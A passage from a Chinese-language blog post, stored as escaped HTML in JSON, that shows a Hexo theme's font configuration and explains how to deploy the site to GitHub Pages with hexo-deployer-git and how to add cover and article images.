data-num=\"108\"></td><td><pre><span class=\"token comment\"># 加载谷歌字体</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token key atrule\">font</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>  <span class=\"token comment\"># Font options:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>  <span class=\"token comment\"># `external: true` will load this font family from `host` above.</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>  <span class=\"token comment\"># `family: Times New Roman`. Without any quotes.</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>  <span class=\"token comment\"># `size: x.x`. Use `em` as unit. Default: 1 (16px)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>  <span class=\"token comment\"># Global font settings used for all elements inside &lt;body>.</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>  <span class=\"token key atrule\">global</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span> Mulish</pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token key atrule\">size</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>  <span class=\"token comment\"># Font settings for alternate title.</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>  <span class=\"token key atrule\">logo</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span> Fredericka the Great</pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    <span class=\"token key atrule\">size</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3.5</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>  <span class=\"token comment\"># Font settings for site title.</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>  <span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span> Noto Serif JP</pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token key atrule\">size</span><span class=\"token punctuation\">:</span> <span class=\"token number\">2.5</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>  <span class=\"token comment\"># Font settings for headlines (&lt;h1> to &lt;h6>).</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>  <span class=\"token key atrule\">headings</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span> Noto Serif SC</pre></td></tr><tr><td data-num=\"138\"></td><td><pre>    <span class=\"token key atrule\">size</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>  <span class=\"token comment\"># Font settings for posts.</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>  <span class=\"token key atrule\">posts</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>  <span class=\"token comment\"># Font settings for &lt;code> and code blocks.</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>  <span class=\"token key atrule\">codes</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token key atrule\">external</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    <span class=\"token key atrule\">family</span><span class=\"token punctuation\">:</span> Inconsolata</pre></td></tr></table></figure><h1 id=\"发布到github-pages\"><a class=\"anchor\" href=\"#发布到github-pages\">#</a> 发布到 Github Pages</h1>\n<p><code>npm install hexo-deployer-git --save</code></p>\n<p>修改根目录下的  <code>_config.yml</code> ，配置  <code>GitHub</code>  相关信息</p>\n<pre><code>deploy:\n  type: git\n  repo: https://github.com/Xh1Xxhg/Xh1Xxhg.github.io.git\n  branch: main\n  token: ghp_xxxxxxxxxxxxxxxxxxx(自己生成)\n</code></pre>\n<p>token 生成</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240229150023484.png\" alt=\"image-20240229150023484\" /></p>\n<p><code>hexo g -d</code>  部署</p>\n<p>直接访问即可</p>\n<p>https://&lt;yourname&gt;.github.io/</p>\n<h1 id=\"发布文章\"><a class=\"anchor\" href=\"#发布文章\">#</a> 发布文章</h1>\n<p>清空根目录 /public 目录所有文件，重新</p>\n<p><code>hexo g</code></p>\n<p><code>hexo server</code></p>\n<p><code>hexo g -d</code></p>\n<h2 id=\"封面图片设置\"><a class=\"anchor\" href=\"#封面图片设置\">#</a> 封面图片设置</h2>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>YAML处设置</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>cover: assets/wallpaper-2572384.jpg</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>图片存放位置</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;root>/source/assets/wallpaper-2572384.jpg</pre></td></tr></table></figure><h2 id=\"文章图片\"><a class=\"anchor\" href=\"#文章图片\">#</a> 文章图片</h2>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>图片插入</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>![](/assets/wallpaper-2572384.jpg)</pre></td></tr></table></figure><h2 id=\"支持代码块\"><a class=\"anchor\" href=\"#支持代码块\">#</a> 支持代码块</h2>\n<p>plain、rust、json、python、html、javascript、cpp、sql、objectivec、java、swift、css、ruby、makefile、go、bash、ini</p>\n",
            "tags": [
                "开发",
                "As Developers"
            ]
        }
    ]
}